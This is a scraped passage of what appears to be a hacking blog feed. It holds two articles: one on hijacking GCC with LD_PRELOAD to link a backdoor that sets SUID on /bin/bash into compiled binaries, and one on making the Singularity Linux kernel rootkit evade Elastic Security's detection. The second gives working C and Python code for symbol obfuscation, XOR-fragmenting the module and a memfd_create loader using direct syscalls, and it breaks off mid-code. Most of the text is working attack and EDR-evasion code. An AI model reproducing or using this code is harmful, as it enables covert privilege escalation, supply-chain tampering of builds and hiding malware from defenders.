\u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = 